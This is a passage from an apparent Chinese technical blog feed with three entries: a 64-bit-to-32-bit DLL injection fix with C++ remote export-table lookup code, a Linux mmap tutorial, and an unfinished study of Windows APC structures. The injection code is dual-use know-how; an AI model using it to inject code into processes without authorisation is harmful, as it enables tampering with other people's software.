    <content type="html"><![CDATA[<p>故事开始于有人在我的项目中提了issue，也是我注册 github 来收到的第一个issue，因此我也非常重视。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>issue 的内容提到了，我的项目 Xprocess 注入器，没有办法实现注入 32 位进程的操作。他也给出了出错的原因，我没有在代码中获取远端的 LoadLibraryW 函数的地址。我一开始会以为很简单，网上应该有很多的实现，但是事实上，居然很难找到现成的代码。</p><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>常见的方法可以获取目标模块的 <code>kernel32.dll</code> 的地址然后获取到 LoadLibraryW 函数的地址，但是遍历模块发现 64 位的程序无法使用 <code>HANDLE ths = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,PID);</code> 的方式去获得模块的地址，因为只能获取到 ntdll 和 Wow 开头的几个模块，而在 32 位下编译就可以使用这个 API 获取到真实的模块地址，但是这与我们的目标不符，因此不考虑。</p><p>后面搜搜找找找到了一个可以用的 API 是 EnumProcessModulesEx。它能够获取 32 位进程远程模块加载的基地址。获取了基地址之后我又想了很久想怎么找到 LoadLibraryW。最初的一个想法是希望 ntdll 中存在函数 GetProcAddress，然后先通过一个远线程调用得到返回之后，等待线程返回就可以找到这个函数的地址了。可惜现实给了我当头一棒，它也在 kernel32.dll 里导出的。</p><p>最后我找到了一篇手动实现 GetProcAddress 的帖子[1]，于是有了一个灵感，将这个手动实现 GetProcAddress 去实现，然后替换为远程版本的。</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>首先确定这个代码是可运行且无误的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">MyGetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HMODULE hModule,    <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpProcName   <span class="comment">// function name</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pImageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pImageNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    pImageDosHeader=(PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    pImageNtHeader=(PIMAGE_NT_HEADERS)((DWORD)hModule+pImageDosHeader-&gt;e_lfanew);</span><br><span class="line">    pImageExportDirectory=(PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule+pImageNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    DWORD *pAddressOfFunction = (DWORD*)(pImageExportDirectory-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line">    DWORD *pAddressOfNames = (DWORD*)(pImageExportDirectory-&gt;AddressOfNames + (DWORD)hModule);</span><br><span class="line">    DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory-&gt;NumberOfNames);</span><br><span class="line">    DWORD dwBase = (DWORD)(pImageExportDirectory-&gt;Base);</span><br><span class="line"></span><br><span class="line">    WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory-&gt;AddressOfNameOrdinals + (DWORD)hModule);</span><br><span class="line">    DWORD dwName = (DWORD)lpProcName;</span><br><span class="line">    <span class="keyword">if</span> ((dwName &amp; <span class="number">0xFFFF0000</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> xuhao;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;(<span class="type">int</span>)dwNumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *strFunction = (<span class="type">char</span> *)(pAddressOfNames[i] + (DWORD)hModule);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">lstrcmp</span>(lpProcName, strFunction) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这个是通过以序号的方式来查函数地址的</span></span><br><span class="line">    xuhao:</span><br><span class="line">    <span class="keyword">if</span> (dwName &lt; dwBase || dwName &gt; dwBase + pImageExportDirectory-&gt;NumberOfFunctions - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (pAddressOfFunction[dwName - dwBase] + (DWORD)hModule);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 hModule 其实就是当前模块的地址。可以发现它采用解析 PE 文件的方式去遍历模块的导出表。</p><p>本地的实现了下一步就是实现远程的版本，这里需要非常仔细地去研究每一个访存的位置，因为在这个代码里一个简简单单的变量访问很有可能在远程版本中就需要通过 ReadProcessMemory 来实现。</p><p>下面我给出我写好的结果（只适配了32位的，64位的需要改一下 NT 头结构体）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetRemoteProcAddress</span><span class="params">(HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName)</span> </span>&#123;</span><br><span class="line">    BYTE buffer[<span class="number">4096</span>];</span><br><span class="line">    SIZE_T bytesRead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, hModule, buffer, <span class="built_in">sizeof</span>(buffer), &amp;bytesRead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)buffer + dosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD RVAForExpDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + RVAForExpDir, buffer, <span class="built_in">sizeof</span>(IMAGE_EXPORT_DIRECTORY), &amp;bytesRead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)buffer ;</span><br><span class="line">    DWORD funcAddr = (DWORD)( exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    DWORD nameAddr = (DWORD)( exportDir-&gt;AddressOfNames);</span><br><span class="line">    DWORD nameOrdAddr = (DWORD)( exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">256</span>];</span><br><span class="line">        DWORD TrueNameAddr;</span><br><span class="line">        WORD TrueOrd;</span><br><span class="line">        DWORD TrueFuncAddr;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + nameAddr + <span class="built_in">sizeof</span>(DWORD)*i, &amp;TrueNameAddr, <span class="built_in">sizeof</span>(TrueNameAddr), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (LPCVOID)((BYTE*)hModule + (DWORD)TrueNameAddr), name, <span class="built_in">sizeof</span>(name), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">stricmp</span>(name, lpProcName) == <span class="number">0</span>) &#123;</span><br><span class="line">            DWORD LoadLibraryAddr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + nameOrdAddr + <span class="built_in">sizeof</span>(WORD)*i, &amp;TrueOrd, <span class="built_in">sizeof</span>(TrueOrd), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + funcAddr + <span class="built_in">sizeof</span>(DWORD)*(TrueOrd), &amp;TrueFuncAddr, <span class="built_in">sizeof</span>(TrueFuncAddr), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (FARPROC)(TrueFuncAddr + (BYTE*)hModule);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再判断注入的目标进程是不是 32 位的来选择合适的获取地址的方式去注入，最后实现也非常成功。</p><p><a href="https://github.com/xia0ji233/Xprocess/issues/2">issue 原文</a></p><p><a href="https://github.com/xia0ji233/Xprocess/commit/cb091a4347fdcc3a1d812b1740f6a14d214b7888">本次的 commit</a></p><p>特此分享一下本次的经历，也给各位师傅们一个 64 位注入 32 位进程的参考案例。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1] <a href="https://cloud.tencent.com/developer/article/1471341">https://cloud.tencent.com/developer/article/1471341</a></li></ul>]]></content>
    
    
    <summary type="html">故事开始于有人在我的项目中提了issue</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="RemoteThreadInject" scheme="https://xia0ji233.github.io/categories/Windows/RemoteThreadInject/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux mmap</title>
    <link href="https://xia0ji233.github.io/2024/06/10/mmap/"/>
    <id>https://xia0ji233.github.io/2024/06/10/mmap/</id>
    <published>2024-06-09T19:00:00.000Z</published>
    <updated>2024-06-09T19:01:28.825Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习一下 Linux 的 9 号系统调用 mmap，它在虚拟内存的管理中拥有着至高无上的地位。</p><span id="more"></span><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>众所周知，虚拟内存是一种非常成功的计算机内存管理技术。它使得多个进程可以拥有相同的地址，并且应用层开发者不必考虑不同进程地址冲突的问题，所有的进程都可以使用同样地址的虚拟内存。</p><p>每个进程的虚拟内存都是独立的，进程看似拥有一大片内存，实际上能用的仅有一小部分，而正是虚拟内存技术拯救了这一切，使得物理内存不会被过度碎片化而导致利用率低下。</p><h2 id="mmap函数介绍"><a href="#mmap函数介绍" class="headerlink" title="mmap函数介绍"></a>mmap函数介绍</h2><p>它用于创建一片虚拟内存，这个虚拟内存可以是映射新分配的物理内存，也可以是映射已有的物理内存，甚至是映射磁盘文件。</p><p>同样先看它的函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">           <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="comment">// 返回：若成功时则为指向映射区域的指针，若出错则为 MAP_FAILED(-1)。</span></span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li>start：按时 mmap 尽量以该地址为起点分配连续内存，如果给 NULL 值，则会随机分配。</li><li>length：指示虚拟内存的长度，一般会以页为单位。</li><li>prot：指示虚拟内存的保护属性，一般为下面四个宏或者其组合：<ul><li>PROT_EXEC：这个区域内的页面由可以被 CPU 执行的指令组成。</li><li>PROT_READ：这个区域内的页面可读。</li><li>PROT_WRITE：这个区域内的页面可写。</li><li>PROT_NONE：这个区域内的页面不能被访问。</li></ul></li><li>flags：指示该虚拟内存的映射方式，通常需要指定 MAP_SHARED 和 MAP_PRIVATE 中的其中一个，具体标志位如下所示：<ul><li>MAP_FIXED：如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。</li><li>MAP_SHARED：对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</li><li>MAP_PRIVATE：对映射区域的写入操作会产生一个映射文件的复制，该内存区域所对的实际内存是写拷贝的，任何修改不会对原文件产生操作。</li><li>MAP_ANONYMOUS：建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</li><li>MAP_DENYWRITE：只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</li><li>MAP_LOCKED：将映射区域锁定住，该内存区域在程序运行时不会被交换出去。</li></ul></li><li>fd：指示映射到内存的文件描述符。</li><li>offset：文件的偏移量。</li></ul><h2 id="mmap的具体用途"><a href="#mmap的具体用途" class="headerlink" title="mmap的具体用途"></a>mmap的具体用途</h2><h3 id="映射文件"><a href="#映射文件" class="headerlink" title="映射文件"></a>映射文件</h3><p>为了避免大量 IO，可以选择以共享方式将文件映射到内存中，如果想操作文件可以仅仅修改映射的内存便可以达到修改文件的效果，下面是示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename=<span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_file</span><span class="params">()</span>&#123;</span><br><span class="line">    unlink(filename);</span><br><span class="line">    <span class="type">int</span> fd=open(filename,O_RDWR|O_CREAT,<span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        write(fd,<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    prepare_file();</span><br><span class="line">    <span class="type">int</span> fd=open(filename,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MAP_SHARED;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *area=mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(area==<span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ((<span class="type">char</span> *)area)[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行之后，创建一个带有 4096 个 a 的文件，并且每秒将内存中的 a 修改为 1，同时外部可以不停地 cat 文件，会发现文件会被同步修改。</p><h3 id="匿名内存"><a href="#匿名内存" class="headerlink" title="匿名内存"></a>匿名内存</h3><p>在 flags 中加入标志 MAP_ANONYMOUS 可以选择不映射文件而是选择让内核自己找一片空的内存映射出来。这个如果还设置了共享标志位 MAP_SHARED，那么这段内存将只有一份，由其它所有映射了这片内存的进程共享。</p><p>因为是匿名内存，不关联任何对象，因此另外一个与此毫无关联的进程无法直接映射这片内存，所以如果要做多进程共享内存，则需要映射完内存之后 fork 进程，这样多个进程就会共享这片内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MAP_ANONYMOUS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ANONYMOUS 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *ptr=mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">                ptr[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">0x1000</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">                ptr[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(ptr);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果也可以发现两个子进程的修改都可以被父进程读取到。</p><img src="/2024/06/10/mmap/1.png" class="">]]></content>
    
    
    <summary type="html">今天学习一下 Linux 的 9 号系统调用 mmap</summary>
    
    
    
    <category term="Linux" scheme="https://xia0ji233.github.io/categories/Linux/"/>
    
    <category term="mmap" scheme="https://xia0ji233.github.io/categories/Linux/mmap/"/>
    
    
  </entry>
  
  <entry>
    <title>用户APC机制学习</title>
    <link href="https://xia0ji233.github.io/2024/06/04/APC1/"/>
    <id>https://xia0ji233.github.io/2024/06/04/APC1/</id>
    <published>2024-06-03T17:00:00.000Z</published>
    <updated>2024-06-03T17:38:51.599Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下 Windows 的 APC 机制</p><span id="more"></span><h2 id="APC简介"><a href="#APC简介" class="headerlink" title="APC简介"></a>APC简介</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>异步过程调用 (APC) 是异步执行的函数。 APC 类似于延迟过程调用 (DPC)，但与 DPC 不同，APC 在特定线程的上下文中执行。 除文件系统和文件系统筛选器驱动程序以外的驱动程序不直接使用 APC，但操作系统的其他部分使用 APC，因此你需要了解 APC 的工作原理[1]。</p><p>过程调用可以理解为C语言当中的函数，而异步就是它区别于一般过程调用的特征（先说一句废话）。</p><h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>那么先来看看 APC 的内核结构体[3]。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC</span> &#123;</span></span><br><span class="line">    UCHAR Type;</span><br><span class="line">    UCHAR SpareByte0;</span><br><span class="line">    UCHAR Size;</span><br><span class="line">    UCHAR SpareByte1;</span><br><span class="line">    ULONG SpareLong0;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span> *<span class="title">Thread</span>;</span></span><br><span class="line">    LIST_ENTRY ApcListEntry;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _NTSYSTEM_</span></span><br><span class="line">    PKKERNEL_ROUTINE KernelRoutine;</span><br><span class="line">    PKRUNDOWN_ROUTINE RundownRoutine;</span><br><span class="line">    PKNORMAL_ROUTINE NormalRoutine;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Reserved[<span class="number">3</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID NormalContext;</span><br><span class="line">    PVOID SystemArgument1;</span><br><span class="line">    PVOID SystemArgument2;</span><br><span class="line">    CCHAR ApcStateIndex;</span><br><span class="line">    KPROCESSOR_MODE ApcMode;</span><br><span class="line">    BOOLEAN Inserted;</span><br><span class="line">&#125; KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;</span><br></pre></td></tr></table></figure><p>拿到一个结构体不一定先理解它各个成员的含义，可以先按照自己的想法给它予以一些成员，再通过比对去更完善地认识这些成员。<br>计算机执行的最小单位就是线程，而一个线程可以调用多个过程，因此成员中有一个 _KTHREAD * 类型的结构体指示了这个过程所属的线程。一个过程你应当告知它从何处开始，其实这里跟线程差不多，线程也有 StartRoutine 这个成员标识，而 APC 会有类似的三个变量（KernelRoutine，RundownRoutine，NormalRoutine）来标识它的起点。</p><p>Normal 和 Kernel 应该会标识这个 APC 在用户模式下和内核模式下的入口。</p><p>至于 RundownRoutine，这里参考一篇外文文献。</p><blockquote><p>In general, every APC object must contain a valid <strong>KernelRoutine</strong> function pointer, whatever its kind. This driver-defined routine will be the first one to run when the APC is successfully delivered and executed by the NT’s APC dispatcher. User-mode APCs must also contain a valid <strong>NormalRoutine</strong> function pointer, which must reside in user memory. Likewise, regular kernel-mode APCs contain a valid <strong>NormalRoutine</strong>, which runs in kernel mode just like <strong>KernelRoutine</strong>. Optionally, either kind of APC may define a valid <strong>RundownRoutine</strong>. This routine must reside in kernel memory and is only called when the system needs to discard the contents of the APC queues, such as when the thread exits. In this case, neither <strong>KernelRoutine</strong> nor <strong>NormalRoutine</strong> are executed, just the <strong>RundownRoutine</strong>. An APC without such a routine will be deleted[4].</p></blockquote><p>这一段主要讲述了，不论是用户 APC 还是内核 APC，都需要定义一个正确的KernelRoutine，用户模式的APC需要额外定义 NormalRoutine。当线程退出且该APC结构没有被执行时，会执行 RundownRoutine 所指向的处理函数。没有定义 RundownRountine 的 APC（即 <code>RundownRoutine==NULL</code> 且没有被执行的 APC）会被系统直接释放（执行 <code>ExFreePool(APC)</code>）。</p><p>如果程序员没有使用 <code>ExAllocatePool(NonPagedPool，sizeof(KAPC))</code> 的方式去分配内存时，则必须定义 <code>RundownRoutine</code> 去指示系统释放该 APC。这里存疑一下，如果线程 APC 被执行完毕需要释放，那么是否需要通过 RundownRoutine 去告知系统调用该函数去释放该 APC。</p><p>再来看另一个结构体 